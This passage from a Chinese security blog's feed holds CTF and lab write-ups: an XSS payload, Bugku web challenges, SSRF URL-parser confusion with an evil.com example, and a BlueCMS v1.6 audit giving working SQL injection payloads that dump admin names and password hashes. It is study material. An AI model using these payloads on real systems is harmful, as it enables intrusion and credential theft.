class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是关于表单的，表单里面有个action，如果在form表单里面有个input 的name也叫action的话，name获取action时候得到的input里面的内容不是表单的内容。</p><p>payload：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:prompt(1)#&#123;"action":1&#125;</span><br></pre></td></tr></table></figure><h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p><a href="http://drops.xmd5.com/static/drops/tips-3059.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-3059.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;XSS-Challenge&quot;&gt;&lt;a href=&quot;#XSS-Challenge&quot; class=&quot;headerlink&quot; title=&quot;XSS Challenge&quot;&gt;&lt;/a&gt;XSS Challenge&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;今天无意中看见这个然后顺便做了一下，
      
    
    </summary>
    
      <category term="web安全" scheme="http://onekingcc.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="xss" scheme="http://onekingcc.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>Bugku-ctf</title>
    <link href="http://onekingcc.github.io/2019/11/13/Bugku-ctf/"/>
    <id>http://onekingcc.github.io/2019/11/13/Bugku-ctf/</id>
    <published>2019-11-12T16:00:00.000Z</published>
    <updated>2020-11-14T06:50:19.902Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址：<a href="https://ctf.bugku.com/challenges" target="_blank" rel="noopener">https://ctf.bugku.com/challenges</a></p><p>这里只是做了部分题目还有很多题目没来的及。以后有空在写吧</p><h3 id="web2"><a href="#web2" class="headerlink" title="web2 :"></a>web2 :</h3><p>这里做一下一些基础题目巩固一下知识web2这里打开链接查看源代码可以直接拿到flag<img src="/images/bugctf/1573544169289.png" alt="1573544166418"></p><h3 id="计算器："><a href="#计算器：" class="headerlink" title="计算器："></a>计算器：</h3><p>这里发现输入的数据只能输入1位 然后审查元素发现maxlength=1这里直接修改代码为3</p><p><img src="/images/bugctf/1573544431438.png" alt="1573544431438"></p><p>最后直接拿到flag<img src="/images/bugctf/1573544492988.png" alt="1573544492988"></p><h3 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h3><p><img src="/images/bugctf/1573544632396.png" alt="1573544632396"></p><p>这里进来是可以直接看到代码的，可以看出当get过来的参数what=flag时 就可以拿到flag</p><p><img src="/images/bugctf/1573544935076.png" alt="1573544935076"></p><h3 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h3><p>这里跟get差不多的只是说这里请求方式是post方式的这里至于要构造表单 或者抓包 或者hackbar都可以</p><p><img src="/images/bugctf/1573545095593.png" alt="1573545095593"></p><p><img src="/images/bugctf/1573545396397.png" alt="1573545396397"></p><h3 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h3><p>这关进来也是直接看到代码</p><p><img src="/images/bugctf/1573545504676.png" alt="1573545504676"></p><p>这里发现要输出flag有个条件就是：is_numeric这个函数胡是检测变量是否为数字或数字字符串，这里必须要num这个变量不是数字和num为1才会输出flag，这里想到的是1加字符串。利用php的弱类型比较，双等于不会去判断类型的比较，这里还可以用科学计数的方法，让num这个值表示既是1也是不是纯数字。<img src="/images/bugctf/1573546075026.png" alt="1573546075026"></p><p><img src="/images/bugctf/1573546350802.png" alt="1573546350802"></p><h3 id="web3："><a href="#web3：" class="headerlink" title="web3："></a>web3：</h3><p>一直跳flag就在这里查看源代码发现<img src="/images/bugctf/1573547153016.png" alt="1573547153016"></p><p>这个应该是被实体编码了这里直接解码就可以得到flag<img src="/images/bugctf/1573547462880.png" alt="1573547462880"></p><h3 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h3><p>这里提示把flag.baidu.com解析到123.206.87.240这里windows下面可以直接拿到在<code>windows</code>下找到<code>c:/windows/system32/drivers/etc/host</code>文件<img src="/images/bugctf/1573547933407.png" alt="1573547933407"></p><p>按理说当我访问发个flag.bugku.com就可以拿到flag才对但是这里没有拿到  也不知道为啥，</p><h3 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h3><p>这里用burp不断的放包<img src="/images/bugctf/1573549220044.png" alt="1573549220044"></p><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p><img src="/images/bugctf/1573608043784.png" alt="1573608043784"></p><p>这里直接get一个参数打印一个全局看看，发现可以直接拿到flag</p><p><img src="/images/bugctf/1573614095258.png" alt="1573614095258"></p><h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p><img src="/images/bugctf/1573614232232.png" alt="1573614232232"></p><p>这里直接查看源代码这里发现是这个，有点懵了  查了一下发现这是jsFuck</p><p><img src="/images/bugctf/1573614380215.png" alt="1573614380215">·</p><p><img src="/images/bugctf/1573631026743.png" alt="1573631026743"></p><h3 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h3><p><img src="/images/bugctf/1573636642491.png" alt="1573636642491"></p><p><img src="/images/bugctf/1573636497120.png" alt="1573636497120"></p><p><img src="/images/bugctf/1573636734712.png" alt="1573636734712"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;题目地址：&lt;a href=&quot;https://ctf.bugku.com/challenges&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://ctf.bugku.com/challenges&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这里只是做了部分题目还有很多
      
    
    </summary>
    
      <category term="ctf" scheme="http://onekingcc.github.io/categories/ctf/"/>
    
    
      <category term="bugctf" scheme="http://onekingcc.github.io/tags/bugctf/"/>
    
  </entry>
  
  <entry>
    <title>Abusing  URL Parsers</title>
    <link href="http://onekingcc.github.io/2019/09/05/Abusing%20%20URL%20Parsers/"/>
    <id>http://onekingcc.github.io/2019/09/05/Abusing  URL Parsers/</id>
    <published>2019-09-04T16:00:00.000Z</published>
    <updated>2020-11-14T06:51:16.301Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Abusing-URL-Parsers"><a href="#Abusing-URL-Parsers" class="headerlink" title="Abusing  URL Parsers"></a>Abusing  URL Parsers</h2><p>本文是基于作者：<strong>Orange</strong>的ppt的一些理解并记录下来，如有理解不当，还望斧正</p><p>原文地址：<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$url = <span class="string">'http://'</span> . $_GET[url];</span><br><span class="line">$parsed = parse_url($url);</span><br><span class="line"><span class="keyword">if</span> ( $parsed[port] == <span class="number">80</span> &amp;&amp; $parsed[host] == <span class="string">'google.com'</span>) &#123;</span><br><span class="line">readfile($url);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'You Shall Not Pass'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对传入的url进行解析，port如果为80端口,host为googel.com,然后就会执行readfile()这里的readfile()就可以用来实现ssrf攻击，这里要知道parse_url()是如何解析的。</p><p>官方说的parse_url函数解析的是一个 URL ，返回的是一个数组，包含在 URL 中出现的各种组成部分。这个函数<em>不是</em>用来验证给定 URL 的合法性的，只是将其分解为下面列出的部分。不完整的 URL 也被接受，<strong>parse_url()</strong>会尝试尽量正确地将其解析。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">'http://username:password@hostname/path?arg=value#anchor'</span>;</span><br><span class="line"></span><br><span class="line">print_r(parse_url($url));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> parse_url($url, PHP_URL_PATH);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>output:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [scheme] =&gt; http [host] =&gt; hostname [user] =&gt; username [pass] =&gt; password [path] =&gt; /path [query] =&gt; arg=value [fragment] =&gt; anchor ) /path</span><br></pre></td></tr></table></figure><p><strong>scheme：代表访问的协议，一般为http或者https以及ftp</strong></p><p><strong>host：主机名，域名，比如：<a href="http://www.google.com。" target="_blank" rel="noopener">www.google.com。</a></strong></p><p><strong>user</strong>：<strong>用户</strong></p><p><strong>port</strong>：<strong>端口号</strong></p><p><strong>path</strong>：<strong>查找路径</strong></p><p><strong>query-string：查询字符串</strong></p><p><strong>anchor：锚点，后台一般不用管，前端用来做页面的定位的。</strong></p><p>当对本文的第一个php传入的url格式为：<a href="http://127.0.0.1:11211:80,对调用readfile()函数的时候解析的是11211端口而在PHP" target="_blank" rel="noopener">http://127.0.0.1:11211:80,对调用readfile()函数的时候解析的是11211端口而在PHP</a> 中的parse_url解析的是80 端口，这里就由于URL解析器跟url解析产生的差异造成ssrf利用。里面有张图说明的很清楚</p><p><img src="/images/urlparser/1567663898650.png" alt="1567663898650"></p><p>在文中还引入了FRC3986</p><p>RFC3986文档规定，Url中只允许包含以下四种：</p><p>​                   1、英文字母（a-zA-Z）</p><p>​                   2、数字（0-9）</p><p>​                   3、-_.~ 4个特殊字符</p><p>​                   4、所有保留字符，RFC3986中指定了以下字符为保留字符（英文字符）：     ! * ‘ ( ) ; : @ &amp; = + $ , / ? # [ ]</p><p><img src="/images/urlparser/1567664365902.png" alt="1567664365902"></p><p>这里如果构造<strong><a href="http://google.com/#@evil.com/" target="_blank" rel="noopener">http://google.com/#@evil.com/</a></strong>在php 中的parse_url解析的是googel.com,而readfile执行的是RFC的定义指向的是evil.com.</p><p><img src="/images/urlparser/1567664693428.png" alt="1567664693428"></p><p><strong>end</strong></p><p>这个ppt里面的内容有点丰富  [滑稽脸]</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Abusing-URL-Parsers&quot;&gt;&lt;a href=&quot;#Abusing-URL-Parsers&quot; class=&quot;headerlink&quot; title=&quot;Abusing  URL Parsers&quot;&gt;&lt;/a&gt;Abusing  URL Parsers&lt;/h2&gt;&lt;p&gt;
      
    
    </summary>
    
      <category term="web安全" scheme="http://onekingcc.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="url" scheme="http://onekingcc.github.io/tags/url/"/>
    
  </entry>
  
  <entry>
    <title>代码审计之SQL注入：bluecms_v1.6</title>
    <link href="http://onekingcc.github.io/2019/07/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%EF%BC%9Abluecms_v1.6/"/>
    <id>http://onekingcc.github.io/2019/07/11/代码审计之SQL注入：bluecms_v1.6/</id>
    <published>2019-07-10T16:00:00.000Z</published>
    <updated>2020-11-14T06:54:05.340Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这个cms的漏洞很早就爆出来了，而且很多网站都有相应的文章，这里只是针对自己在代码审计这方面学习的加强，因为自己太菜所以选了一个结构稍微简单，对新手友好一点的cms。<a id="more"></a></p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>PHPstdudy</p><p>Seay源代码审计系统</p><p>BlueCMS v1.6 sp1源码</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><img src="/images/Bluecmssql/1562685158396.png" alt="1562685158396"></p><p>进入安装阶段，填写相应的数据库，数据库密码安装好之后就是这个界面</p><p><img src="/images/Bluecmssql/1562685307531.png" alt="1562685307531"></p><h3 id="开始审计"><a href="#开始审计" class="headerlink" title="开始审计"></a>开始审计</h3><p>​    这里由于只是静态的进行审计所以用的notepad++来查看源码然后我们直接把cms放到Seay这个系统里面审一下，当然这个误报挺多的不过对新手来说可以减少很多的工作量，这时我们发现扫出了来了一些。<img src="/2019/07/11/代码审计之SQL注入：bluecms_v1/D:%5Conekingcc%5Csource%5Cimages%5CBluecmssql%5C1562685737530.png" alt="1562685737530"></p><p>发现在upload/ad_js.php存在sql注入，这时我们跟进去看一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ad_id = !<span class="keyword">empty</span>($_GET[<span class="string">'ad_id'</span>]) ? trim($_GET[<span class="string">'ad_id'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($ad_id))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Error!'</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ad = $db-&gt;getone(<span class="string">"SELECT * FROM "</span>.table(<span class="string">'ad'</span>).<span class="string">" WHERE ad_id ="</span>.$ad_id);</span><br></pre></td></tr></table></figure><p>发现这里ad_id传入了一个$ad_id，我们发现这个$ad_id是在代码1行那里传过来的id，判断了值是否为空然后执行getone()方法，然后跟进getone这个方法我们发现这个方法在路径uploads\include\mysql.class.php中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getone</span><span class="params">($sql, $type=MYSQL_ASSOC)</span></span>&#123;</span><br><span class="line">    $query = <span class="keyword">$this</span>-&gt;query($sql,<span class="keyword">$this</span>-&gt;linkid);</span><br><span class="line">    $row = mysql_fetch_array($query, $type);</span><br><span class="line">    <span class="keyword">return</span> $row;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里封装了一个sql查询的函数，指定的类型为数组类型<code>MYSQL_ASSOC</code>是关联数组，<code>mysql_fetch_array</code>函数从结果集中取得一行作为关联数组最后返回行，这里我们已经发现这个过程下来没有没有任何的过滤的，主要是插入到数据库查询语句中的$ad_id没有经过任何的过滤，因而导致了SQL注入。从代码中可以看出：<code>$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&#39;ad&#39;).&quot; WHERE ad_id =&quot;.$ad_id);</code>说明存在整形注入。</p><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><p>找到程序入口通过order by查询首先查询多少列，我们发现在order by 7无回显在8的时候报错了说明有8列</p><p><img src="/images/Bluecmssql/1562687979352.png" alt="1562687979352"></p><p><img src="/images/Bluecmssql/1562688018782.png" alt="1562688018782"></p><p>用联合查询数据库信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ad_id=1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure><p>这里发现显示的是一个空白的页面这时需要右键查看源码发现</p><p><img src="/images/Bluecmssql/1562688268808.png" alt="1562688268808"></p><p>查看当前登录的用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ad_id=1 union select 1,2,3,4,5,6,user()</span><br></pre></td></tr></table></figure><p><img src="/images/Bluecmssql/1562688330404.png" alt="1562688330404"></p><p>爆表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ad_id=1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure><p><img src="/images/Bluecmssql/1562688699934.png" alt="1562688699934"></p><p><img src="/images/Bluecmssql/1562688904920.png" alt="1562688904920"></p><p>发现已经成功爆出表名，这里就不继续了直接构造语句获取用户名的密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 +UNION +SELECT+1,2,3,4,5,6,GROUP_CONCAT(admin_name,0x3a,pwd) FROM blue_admin</span><br></pre></td></tr></table></figure><p><img src="/images/Bluecmssql/1562689139317.png" alt="1562689139317"></p><p>发现这里md5加密的直接可以在线解密的</p><p><img src="/images/Bluecmssql/1562689291200.png" alt="1562689291200"></p><h3 id="sql注入二"><a href="#sql注入二" class="headerlink" title="sql注入二"></a>sql注入二</h3><p>再查看Seay发现的可疑注入点，在文件/uploads/include/common.fun.php中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">'HTTP_CLIENT_IP'</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>)) </span><br><span class="line">&#123; </span><br><span class="line">$ip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED'</span>)) </span><br><span class="line">&#123; </span><br><span class="line">$ip = getenv(<span class="string">'HTTP_X_FORWARDED'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED'</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">'HTTP_FORWARDED'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; </span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件中有<code>getip()</code>函数，该函数是用来获取用户IP。getenv这个函数是用来获取环境变量的值并没有对$ip进行校验，然后就全局搜索函数，发现有执行sql语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;INSERT INTO &quot;.table(&apos;comment&apos;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) </span><br><span class="line">VALUES (&apos;&apos;, &apos;$id&apos;, &apos;$user_id&apos;, &apos;$type&apos;, &apos;$mood&apos;, &apos;$content&apos;, &apos;$timestamp&apos;, &apos;&quot;.getip().&quot;&apos;, &apos;$is_check&apos;)&quot;;</span><br><span class="line">$db-&gt;query($sql);</span><br></pre></td></tr></table></figure><p>这里可以利用拼接的点就是<code>&quot;.getip().&quot;</code>这个点，首先要知道的是在SQL语句中的<code>INSERT INTO</code>来插入内容是可以一次插入多条数据的。这里还是废了点时间的对数据库的操作不是很熟 ，insert into这个插入语句是可以一次插多条数据的，所这时我么可以先闭合前面的单引号然后利用第二条插入。payload如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1','1'),('','1','1','1','6',(<span class="keyword">select</span> <span class="keyword">concat</span>(admin_name,<span class="string">':'</span>,pwd) <span class="keyword">from</span> blue_admin),<span class="string">'1'</span>,<span class="string">'1</span></span><br></pre></td></tr></table></figure><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>这是第一次自己整套这么看下来还是挺累的不过这套代码还是比较简单要加强学习啊，要学的东西很多，加强代码审计。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;这个cms的漏洞很早就爆出来了，而且很多网站都有相应的文章，这里只是针对自己在代码审计这方面学习的加强，因为自己太菜所以选了一个结构稍微简单，对新手友好一点的cms。&lt;/p&gt;
    
    </summary>
    
      <category term="代码审计" scheme="http://onekingcc.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>使用第三方接口授权登录github的流程</title>
    <link href="http://onekingcc.github.io/2019/07/09/%E4%BD%BF%E7%94%A8%E7%AC%AC%E4%B8%89%E6%96%B9%E6%8E%A5%E5%8F%A3%E7%99%BB%E5%BD%95github%E7%9A%84%E6%B5%81%E7%A8%8B/"/>
    <id>http://onekingcc.github.io/2019/07/09/使用第三方接口登录github的流程/</id>
    <published>2019-07-09T06:55:01.000Z</published>
    <updated>2020-11-14T06:48:42.798Z</updated>
    
    <content type="html"><![CDATA[<p>因为最近在写登录这个模块功能的时候，然后选择第三方接口登录，阅读了官方文档的API文档，所以决定记录下来<a id="more"></a>：</p><h2 id="登录情景"><a href="#登录情景" class="headerlink" title="登录情景"></a>登录情景</h2><p>首先有一个用户发送一个消息，请求登录社区，这时点击登录时，首先完成自己的逻辑，去构造相应的证书，client_secret，client，client_id然后再去调用github的接口。</p><h2 id="如何调用github接口"><a href="#如何调用github接口" class="headerlink" title="如何调用github接口"></a>如何调用github接口</h2><ol><li>首先它是去调用的一个授权的地址authorize，当验证通过后github会重新访问社区。</li><li>之后github会主动去回调redirect_uri预先写好的地址携带code访问社区</li><li>社区接受到这里的地址请求时，然后通过access_token解析携带code再次调用github</li><li>这里如果code验证正确，就会返回一个access_token</li><li>这时user携带acces_token,如果正确就会返回user信息</li><li>存入数据库，更新登录状态。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;因为最近在写登录这个模块功能的时候，然后选择第三方接口登录，阅读了官方文档的API文档，所以决定记录下来&lt;/p&gt;
    
    </summary>
    
      <category term="开发" scheme="http://onekingcc.github.io/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="开发接口" scheme="http://onekingcc.github.io/tags/%E5%BC%80%E5%8F%91%E6%8E%A5%E5%8F%A3/"/>
    
  </entry>
  
</feed>
